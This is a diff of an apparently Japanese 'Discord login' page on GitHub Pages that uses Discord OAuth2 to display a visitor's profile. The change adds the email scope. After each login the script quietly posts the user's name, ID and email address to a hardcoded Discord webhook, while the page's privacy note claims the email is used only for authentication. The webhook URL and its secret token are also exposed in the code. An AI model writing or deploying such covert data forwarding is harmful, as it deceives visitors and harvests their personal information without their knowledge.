@@ -5,135 +5,225 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Discord ログイン</title>
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
     body {
-      background: #0b0c10;
+      background: linear-gradient(135deg, #0b0c10 0%, #1f2430 100%);
       color: #fff;
-      font-family: "Segoe UI", sans-serif;
+      font-family: "Segoe UI", "Helvetica Neue", sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      margin: 0;
+      min-height: 100vh;
+      padding: 20px;
     }
+    
+    .container {
+      background: rgba(30, 33, 36, 0.9);
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+      padding: 40px;
+      width: 100%;
+      max-width: 480px;
+      text-align: center;
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 30px;
+      color: #7289da;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+    }
+    
+    .logo {
+      font-size: 3rem;
+      margin-bottom: 20px;
+    }
+    
+    .description {
+      color: #b9bbbe;
+      margin-bottom: 30px;
+      line-height: 1.6;
+    }
+    
     button {
       background: #5865F2;
       color: white;
       border: none;
-      padding: 14px 28px;
+      padding: 16px 32px;
       border-radius: 8px;
       font-size: 1.1rem;
       cursor: pointer;
-      transition: 0.2s;
+      transition: all 0.2s ease;
+      font-weight: 600;
+      width: 100%;
+      margin-bottom: 25px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
     }
-    button:hover { background: #4752C4; }
+    
+    button:hover {
+      background: #4752C4;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.25);
+    }
+    
+    button:active {
+      transform: translateY(0);
+    }
+    
     #user-info {
       margin-top: 30px;
-      text-align: center;
-      font-size: 1.2rem;
+      text-align: left;
+      font-size: 1rem;
+      background: rgba(35, 39, 42, 0.7);
+      padding: 20px;
+      border-radius: 8px;
+      border-left: 4px solid #7289da;
     }
-    img {
-      border-radius: 50%;
-      width: 100px;
+    
+    .user-detail {
+      margin-bottom: 12px;
+      display: flex;
+    }
+    
+    .label {
+      font-weight: 600;
+      color: #7289da;
+      min-width: 100px;
+    }
+    
+    .value {
+      color: #fff;
+      word-break: break-all;
+    }
+    
+    .privacy-note {
+      font-size: 0.85rem;
+      color: #8e9297;
+      margin-top: 20px;
+      line-height: 1.5;
+    }
+    
+    .success-message {
+      color: #43b581;
+      font-weight: 600;
       margin-top: 15px;
+      padding: 10px;
+      background: rgba(67, 181, 129, 0.1);
+      border-radius: 4px;
     }
   </style>
 </head>
 <body>
-
-  <h1>Discord ログイン</h1>
-  <button id="login-btn">ログインする</button>
-  <div id="user-info"></div>
+  <div class="container">
+    <div class="logo">👤</div>
+    <h1>Discord ログイン</h1>
+    
+    <p class="description">Discordアカウントでログインして、あなたのプロフィール情報を表示します</p>
+    
+    <button id="login-btn">Discordでログインする</button>
+    
+    <div id="user-info" style="display: none;">
+      <h3>ユーザー情報</h3>
+      <div class="user-detail">
+        <span class="label">ユーザー名:</span>
+        <span class="value" id="username">-</span>
+      </div>
+      <div class="user-detail">
+        <span class="label">メールアドレス:</span>
+        <span class="value" id="email">-</span>
+      </div>
+      <div class="user-detail">
+        <span class="label">ユーザーID:</span>
+        <span class="value" id="userid">-</span>
+      </div>
+      <div class="success-message">ログインに成功しました！</div>
+    </div>
+    
+    <p class="privacy-note">※ 当サービスはDiscordのOAuth2を利用してユーザー認証を行います。メールアドレスを含むアカウント情報は、認証目的以外では使用しません。</p>
+  </div>
 
   <script>
     // =============================
-    // 設定
+    // 設定項目（ここを書き換える）
     // =============================
     const CLIENT_ID = "1432379094137307168";
-    const REDIRECT_URI = "https://nnllmmccc-homepage.github.io/test/";
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1432466902026027008/csghKaeKB8ZOwk61xczNhkbtXfQwnNuUbMhzV5b2aJVq2dDWpxElA5DsU_9Z4jBA4ozb";
+    const REDIRECT_URI = "https://nnllmmccc-homepage.github.io/test/";  
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1432466902026027008/csghKaeKB8ZOwk61xczNhkbtXfQwnNuUbMhzV5b2aJVq2dDWpxElA5DsU_9Z4jBA4ozb"; 
 
-    const OAUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify`;
+    // =============================
+    // Discord OAuth2 認証リンク
+    // =============================
+    // emailスコープを追加してメールアドレスを取得できるようにする
+    const OAUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20email`;
 
     document.getElementById("login-btn").onclick = () => {
       window.location.href = OAUTH_URL;
     };
 
     // =============================
-    // トークン取得処理
+    // ログイン後の処理
     // =============================
     const params = new URLSearchParams(window.location.hash.slice(1));
     const token = params.get("access_token");
 
-    if (token && !localStorage.getItem("discord_auth_done")) {
-      localStorage.setItem("discord_auth_done", "true"); // 二重送信防止
-
+    if (token) {
+      // トークンを使ってユーザー情報取得
       fetch("https://discord.com/api/users/@me", {
         headers: { Authorization: `Bearer ${token}` }
       })
       .then(res => res.json())
       .then(user => {
-        // アバターURL
-        const avatarURL = user.avatar
-          ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
-          : "https://cdn.discordapp.com/embed/avatars/0.png";
+        // ユーザー情報を表示
+        document.getElementById("username").textContent = `${user.username}#${user.discriminator}`;
+        document.getElementById("email").textContent = user.email || "非公開";
+        document.getElementById("userid").textContent = user.id;
+        
+       
+        document.getElementById("user-info").style.display = "block";
+        
+        
+        document.getElementById("login-btn").style.display = "none";
 
-        // アカウント作成日をIDから計算
-        const timestamp = (user.id / 4194304) + 1420070400000;
-        const createdAt = new Date(timestamp).toLocaleString("ja-JP");
-
-        // 表示
-        document.getElementById("user-info").innerHTML = `
-          <img src="${avatarURL}" alt="Avatar"><br>
-          ようこそ、<strong>${user.username}#${user.discriminator}</strong> さん！<br>
-          ユーザーID: ${user.id}<br>
-          アカウント作成日: ${createdAt}<br>
-          <a href="https://discord.com/users/${user.id}" target="_blank" style="color:#7289da;">プロフィールを見る</a>
-        `;
-
-        // Webhook送信
-        const payload = {
-          username: "Discord 認証ログ",
-          embeds: [
-            {
-              title: "✅ 新しいログイン",
-              color: 5814783,
-              thumbnail: { url: avatarURL },
-              fields: [
-                { name: "ユーザー名", value: `${user.username}#${user.discriminator}`, inline: true },
-                { name: "ユーザーID", value: user.id, inline: true },
-                { name: "作成日", value: createdAt, inline: false },
-                { name: "プロフィール", value: `[Discordリンク](https://discord.com/users/${user.id})`, inline: false }
-              ],
-              footer: { text: "GitHub Pages 認証ログシステム" },
-              timestamp: new Date().toISOString()
-            }
-          ]
-        };
-
+        
         fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        })
-        .then(() => {
-          console.log("✅ Webhook送信完了");
-        })
-        .catch(console.error);
-
-        // URLをクリーンに戻す
-        setTimeout(() => {
-          window.history.replaceState({}, document.title, REDIRECT_URI);
-        }, 500);
+          body: JSON.stringify({
+            content: ` **${user.username}#${user.discriminator}** がログインしました！`,
+            embeds: [
+              {
+                title: "ユーザー情報",
+                fields: [
+                  {
+                    name: "ユーザーID",
+                    value: user.id,
+                    inline: true
+                  },
+                  {
+                    name: "メールアドレス",
+                    value: user.email || "非公開",
+                    inline: true
+                  }
+                ],
+                color: 5814783
+              }
+            ]
+          })
+        });
       })
       .catch(err => {
-        document.getElementById("user-info").textContent = "エラーが発生しました。";
+        document.getElementById("user-info").innerHTML = 
+          "<p style='color: #ed4245;'>エラーが発生しました。ページを再読み込みしてください。</p>";
         console.error(err);
       });
-    } else {
-      // 初回や再読み込み時
-      document.getElementById("user-info").textContent = "";
-      localStorage.removeItem("discord_auth_done");
     }
   </script>
 </body>
